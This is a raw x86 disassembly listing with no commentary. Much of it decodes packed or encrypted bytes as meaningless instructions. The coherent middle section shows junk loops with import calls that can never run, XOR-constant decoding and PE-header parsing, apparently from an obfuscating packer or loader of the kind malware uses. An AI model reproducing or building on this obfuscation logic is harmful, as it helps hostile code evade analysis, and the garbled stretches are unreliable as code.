  41383e:	xor    BYTE PTR [edx+0x758f506],0xc0
  413845:	fild   WORD PTR [ebx-0x3a1dd8e2]
  41384b:	dec    ebp
  41384c:	fmul   QWORD PTR [ebx]
  41384e:	mov    bl,0x1d
  413850:	push   cs
  413851:	push   ebx
  413852:	mov    dl,0x9c
  413854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413855:	cli    
  413856:	jb     0x41380d
  413858:	ins    BYTE PTR es:[edi],dx
  413859:	rol    BYTE PTR [esi+0x3c3a739e],0xe4
  413860:	add    BYTE PTR ds:0x98787f75,dl
  413866:	cmp    bh,BYTE PTR [ecx+0x42aaa7cd]
  41386c:	enter  0xe0d7,0x44
  413870:	mov    ebp,0xaa63d20d
  413875:	sub    esi,edi
  413877:	sub    bl,BYTE PTR [edx+ebx*4-0xe718e66]
  41387e:	fbstp  TBYTE PTR [esi]
  413880:	repz sub bh,dh
  413883:	sub    DWORD PTR [edi],edi
  413885:	loopne 0x41383d
  413887:	rol    BYTE PTR [edi-0x28],cl
  41388a:	sub    bh,BYTE PTR ds:0xb559f93e
  413890:	loopne 0x41381a
  413892:	push   es
  413893:	jbe    0x4138aa
  413895:	jl     0x4138f9
  413897:	addr16 out dx,al
  413899:	mov    fs,WORD PTR [edi-0x6834a840]
  41389f:	adc    DWORD PTR [ebp+0x68],0x8c4a67ac
  4138a6:	pop    esp
  4138a7:	cmp    BYTE PTR [ebx-0x23],0xc3
  4138ab:	(bad)  
  4138ac:	pop    ebx
  4138ad:	(bad)
  4138b0:	sub    ebp,edi
  4138b2:	fadd   st,st(1)
  4138b4:	sub    cl,BYTE PTR [esi]
  4138b6:	inc    ecx
  4138b7:	dec    ebx
  4138b8:	in     eax,0x53
  4138ba:	paddusw mm5,mm5
  4138bd:	test   BYTE PTR [ebp+0x7a],ah
  4138c0:	sub    eax,0xba12a579
  4138c5:	pop    ecx
  4138c6:	add    DWORD PTR [ebp+eax*2-0x7ad6a7ee],0x5869598e
  4138d1:	mov    WORD PTR [ecx-0x3a2d45a9],ss
  4138d7:	mov    ch,BYTE PTR [ecx+0x5dbb774e]
  4138dd:	mov    eax,ds:0x7d7a4a58
  4138e2:	and    cl,0xeb
  4138e5:	int3   
  4138e6:	aaa    
  4138e7:	int    0x59
  4138e9:	pop    eax
  4138ea:	cli    
  4138eb:	pop    edx
  4138ec:	fdivp  st(3),st
  4138ee:	ins    DWORD PTR es:[edi],dx
  4138ef:	push   edi
  4138f0:	loopne 0x413950
  4138f2:	inc    edx
  4138f3:	ins    BYTE PTR es:[edi],dx
  4138f4:	mov    dl,0xaa
  4138f6:	idiv   DWORD PTR [ebp+0x1056989e]
  4138fc:	mov    BYTE PTR [eax-0x130f3757],dl
  413902:	arpl   WORD PTR [edx+0x4caa7b27],ax
  413908:	iret   
  413909:	pop    es
  41390a:	mov    eax,ds:0x999f8362
  41390f:	mov    ah,0xa
  413911:	loope  0x413897
  413913:	xor    ecx,DWORD PTR [edx-0x50]
  413916:	repz xor eax,0xc9853c72
  41391c:	stos   DWORD PTR es:[edi],eax
  41391d:	sbb    esp,eax
  41391f:	idiv   DWORD PTR [esi+edi*4+0x4a]
  413923:	inc    ebp
  413924:	ins    BYTE PTR es:[edi],dx
  413925:	or     al,0xc
  413927:	aaa    
  413928:	mov    bl,0x9a
  41392a:	in     eax,dx
  41392b:	xor    cl,BYTE PTR [edx+0x532f9d27]
  413931:	xchg   ecx,eax
  413932:	in     al,0xa6
  413934:	push   eax
  413935:	or     cl,BYTE PTR [esp+esi*8+0x193b0e99]
  41393c:	js     0x4139a1
  41393e:	xchg   esi,eax
  41393f:	mov    WORD PTR [ebp+eiz*2-0x57798db1],cs
  413946:	inc    esp
  413947:	and    esp,DWORD PTR [esi+0x6e]
  41394a:	mov    edx,0xd2ea9488
  41394f:	sub    eax,0x8512a82f
  413954:	sub    al,0x17
  413956:	int3   
  413957:	mov    DWORD PTR [ecx],eax
  413959:	es mov ch,0x77
  41395c:	xchg   esp,eax
  41395d:	xchg   edi,eax
  41395e:	mov    ch,0xd9
  413960:	mov    al,ds:0x89d7026d
  413965:	cmc    
  413966:	div    BYTE PTR [ebx-0x52cf8e]
  41396c:	(bad)  
  41396d:	(bad)  
  41396f:	adc    eax,esp
  413971:	mov    ebp,0x307f6400
  413976:	popf   
  413977:	dec    ecx
  413978:	enter  0x2e4,0x77
  41397c:	mov    bl,0x6b
  41397e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41397f:	add    ch,BYTE PTR [esi+0x22029550]
  413985:	jmp    0xc2fb:0x475ae415
  41398c:	mov    bl,0x90
  41398e:	sbb    dl,BYTE PTR [ebx-0x1]
  413991:	cmp    eax,0xf2d27d73
  413996:	out    dx,eax
  413997:	or     ecx,eax
  413999:	jbe    0x413930
  41399b:	inc    esp
  41399c:	loope  0x4139a5
  41399e:	gs faddp st(6),st
  4139a1:	or     al,BYTE PTR [esi+0x52fc32e0]
  4139a7:	sbb    al,0x64
  4139a9:	jecxz  0x413960
  4139ab:	jmp    0xf8b97446
  4139b0:	ret    
  4139b1:	popf   
  4139b2:	add    DWORD PTR [ecx-0x5005c91c],ebx
  4139b8:	fs int 0xe9
  4139bb:	mov    esi,0xbd1f38e9
  4139c0:	loopne 0x413a20
  4139c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139c3:	pusha  
  4139c4:	inc    ebp
  4139c5:	sub    ah,ch
  4139c7:	dec    edi
  4139c8:	mov    bh,0x73
  4139ca:	mov    al,BYTE PTR [ecx]
  4139cc:	xchg   DWORD PTR [eax+0x5decb8e],esi
  4139d2:	or     al,0xd
  4139d4:	and    al,0x8c
  4139d6:	sbb    al,0x1f
  4139d8:	iret   
  4139d9:	mov    ebx,0xc2e7057
  4139de:	test   eax,0x2b8be896
  4139e3:	mov    ah,0x69
  4139e5:	ficomp WORD PTR [ebx-0x4f5f2ec]
  4139eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139ec:	shl    DWORD PTR [edx],cl
  4139ee:	mov    bl,0x63
  4139f0:	add    BYTE PTR [ebp+esi*1-0x135b6a06],bh
  4139f7:	and    al,0x5e
  4139f9:	mov    eax,0xa3dce0f6
  4139fe:	push   ecx
  4139ff:	test   eax,0x57840bcf
  413a04:	repnz cmp al,0x5f
  413a07:	lock pop ss
  413a09:	push   0x8661c012
  413a0e:	push   eax
  413a0f:	sbb    ch,dl
  413a11:	(bad)  
  413a12:	ins    DWORD PTR es:[edi],dx
  413a13:	jge    0x413a5e
  413a15:	and    bh,bh
  413a17:	cwde   
  413a18:	mov    ecx,0xb858eb52
  413a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a1e:	pop    esi
  413a1f:	push   esi
  413a20:	daa    
  413a21:	push   cs
  413a22:	fst    QWORD PTR [edx+0x196118f6]
  413a28:	lods   eax,DWORD PTR ds:[esi]
  413a29:	mov    ah,0x43
  413a2b:	rcr    DWORD PTR [ecx+ecx*1-0x237a73a2],1
  413a32:	xchg   ecx,eax
  413a33:	sub    cl,bh
  413a35:	ds push edx
  413a37:	stos   DWORD PTR es:[edi],eax
  413a38:	test   eax,0x8ecae45b
  413a3d:	repnz lahf 
  413a3f:	shl    DWORD PTR [ebp+0x69a76888],0x9d
  413a46:	(bad)  
  413a47:	and    eax,0xd06c51a2
  413a4c:	adc    BYTE PTR [ebx+0x2d51b63f],0xca
  413a53:	jnp    0x413acf
  413a55:	out    0x89,eax
  413a57:	cli    
  413a58:	jb     0x413a5d
  413a5a:	into   
  413a5b:	in     al,dx
  413a5c:	pop    edx
  413a5d:	ficomp WORD PTR [edx+0x3bd3bbf2]
  413a63:	push   esp
  413a64:	push   ebp
  413a65:	call   0xc249:0x6451d67b
  413a6c:	dec    esp
  413a6d:	bnd call 0x552cf2ed
  413a73:	popf   
  413a74:	xchg   esp,eax
  413a75:	inc    ecx
  413a76:	shl    dh,0x2a
  413a79:	mov    ah,0x45
  413a7b:	test   al,0x5
  413a7d:	nop
  413a7e:	and    edi,DWORD PTR [eax+0x35b06ab3]
  413a84:	rcl    DWORD PTR [edx-0xd],cl
  413a87:	jp     0x413ae0
  413a89:	rcl    dh,cl
  413a8b:	addr16 inc esi
  413a8d:	push   ds
  413a8e:	mov    ecx,0x1f41edd
  413a93:	and    ch,BYTE PTR [ebx-0x6264ac3a]
  413a99:	mov    ebx,0xf1c64331
  413a9e:	out    dx,al
  413a9f:	push   es
  413aa0:	outs   dx,BYTE PTR ds:[esi]
  413aa1:	sbb    esi,esp
  413aa3:	sbb    ch,0xfa
  413aa6:	push   esp
  413aa7:	mov    BYTE PTR [esi+0x620b6be0],0x9a
  413aae:	pop    edx
  413aaf:	int3   
  413ab0:	mov    DWORD PTR [edi],ebx
  413ab2:	mov    esp,0xb219b672
  413ab7:	push   0x60d93d1
  413abc:	pop    edx
  413abd:	ret    0xe843
  413ac0:	icebp  
  413ac1:	cmp    BYTE PTR [edi-0x1184e2ef],0xd3
  413ac8:	icebp  
  413ac9:	retf   0xf0eb
  413acc:	mov    esp,DWORD PTR [edi-0x73323218]
  413ad2:	inc    ecx
  413ad3:	cmc    
  413ad4:	sbb    edi,0x6e
  413ad7:	and    al,0xd0
  413ad9:	hlt    
  413ada:	lahf   
  413adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413adc:	test   al,0x5a
  413ade:	aaa    
  413adf:	out    dx,al
  413ae0:	cli    
  413ae1:	jb     0x413acc
  413ae3:	int3   
  413ae4:	out    0xd1,al
  413ae6:	or     esi,DWORD PTR [edx+0x7b]
  413ae9:	hlt    
  413aea:	push   eax
  413aeb:	add    eax,0x7987dfd4
  413af0:	or     bh,ah
  413af2:	mov    esi,0xfaef020
  413af7:	outs   dx,BYTE PTR ds:[esi]
  413af8:	jge    0x413ab4
  413afa:	mov    edi,0x45065a8b
  413aff:	pushf  
  413b00:	adc    al,ch
  413b02:	xchg   ecx,eax
  413b03:	ds and bl,bh
  413b06:	inc    edi
  413b07:	mov    dh,0x4c
  413b09:	pop    ss
  413b0a:	jmp    0x413a9a
  413b0c:	dec    esi
  413b0d:	xchg   edx,eax
  413b0e:	adc    eax,0x82cdcf1e
  413b13:	xchg   ebp,eax
  413b14:	cmp    al,0xcb
  413b16:	loopne 0x413b6f
  413b18:	pop    edx
  413b19:	cmp    DWORD PTR [ecx-0x80],eax
  413b1c:	mov    gs,eax
  413b1e:	or     BYTE PTR [ecx+ebp*4-0x1dafe1a6],bl
  413b25:	adc    cl,BYTE PTR [edx+ecx*8-0x3a18c4d4]
  413b2c:	fsubp  st(2),st
  413b2e:	jge    0x413b36
  413b30:	fisubr WORD PTR [ecx]
  413b32:	mov    dl,dh
  413b34:	add    eax,0x835235a8
  413b39:	test   DWORD PTR [ecx-0x1f],ebx
  413b3c:	jle    0x413af3
  413b3e:	call   0xced57dc9
  413b43:	add    eax,0xebaf69e7
  413b48:	xchg   ebp,eax
  413b49:	iret   
  413b4a:	ret    
  413b4b:	inc    edi
  413b4c:	jmp    0xb433:0xa99cbbd
  413b53:	xor    ecx,DWORD PTR [esi+0x71cb37dd]
  413b59:	adc    ch,BYTE PTR [ecx-0x16749ed]
  413b5f:	and    ebx,eax
  413b61:	add    eax,0xef882671
  413b66:	iret   
  413b67:	sbb    ch,BYTE PTR [ebx-0x9]
  413b6a:	adc    ebx,ebx
  413b6c:	push   edi
  413b6d:	sbb    di,WORD PTR [eax+0x62]
  413b71:	sub    esp,DWORD PTR [ebx]
  413b73:	mov    cl,0x8e
  413b75:	mov    ds:0x5e9b349e,al
  413b7a:	jne    0x413bf3
  413b7c:	mov    dl,0xb8
  413b7e:	pop    esp
  413b7f:	mov    dh,0xb7
  413b81:	dec    edi
  413b82:	mov    eax,ds:0xcae98a19
  413b87:	dec    edx
  413b88:	repnz popa 
  413b8a:	rcl    dl,0xfd
  413b8d:	inc    ecx
  413b8e:	jp     0x413b4b
  413b90:	or     bh,bl
  413b92:	add    bh,BYTE PTR [ebx+0x26]
  413b95:	inc    esp
  413b96:	imul   esp,DWORD PTR ds:0x3210ce92,0x46
  413b9d:	xchg   ebp,eax
  413b9e:	fadd   QWORD PTR [eax]
  413ba0:	sbb    al,0x5a
  413ba2:	cmp    ecx,ecx
  413ba4:	dec    edi
  413ba5:	mov    cl,0x86
  413ba7:	push   ecx
  413ba8:	fisubr WORD PTR [edi-0x10]
  413bab:	sbb    ebp,edx
  413bad:	or     DWORD PTR [eax-0x44],ebp
  413bb0:	je     0x413bdc
  413bb2:	cmp    eax,0x1d585939
  413bb7:	jle    0x413b90
  413bb9:	push   ss
  413bba:	rol    ecx,1
  413bbc:	mov    esp,0x6897f59d
  413bc1:	mov    ds:0xc959334c,al
  413bc6:	lahf   
  413bc7:	rcl    DWORD PTR [edx],cl
  413bc9:	push   ecx
  413bca:	sub    ecx,DWORD PTR ss:[ebx-0x33bcadac]
  413bd1:	push   ss
  413bd2:	out    dx,eax
  413bd3:	mov    ds:0xa68f161f,al
  413bd8:	je     0x413b5e
  413bda:	xor    DWORD PTR [ecx+0x2fe0a7ee],edi
  413be0:	aam    0x7a
  413be2:	(bad)  
  413be3:	lods   eax,DWORD PTR ds:[esi]
  413be4:	mov    gs,WORD PTR [ecx]
  413be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413be7:	mov    es,WORD PTR [edx+0x3]
  413bea:	rol    DWORD PTR [ebx-0x2fcc0029],1
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421ca2
  413c08:	mov    ds:0x421caa,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421a72
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x4238b8
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a3e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x4238d3
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423996
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a36
  413f9e:	mov    eax,ds:0x421a46
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421a9e
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c26
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x423a10
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	and    eax,0x7d469362
  414251:	inc    esi
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	outs   dx,DWORD PTR ds:[esi]
  414259:	sub    al,0xe1
  41425b:	mov    dh,0xea
  41425d:	mov    BYTE PTR [eax+esi*1],ah
  414260:	stos   DWORD PTR es:[edi],eax
  414261:	repz int 0x82
  414264:	mov    dl,dh
  414266:	sbb    ebp,esi
  414268:	or     BYTE PTR [edi],ah
  41426a:	mov    esi,0xd57e1293
  41426f:	mov    cl,ah
  414271:	mov    ch,0x1f
  414273:	push   ecx
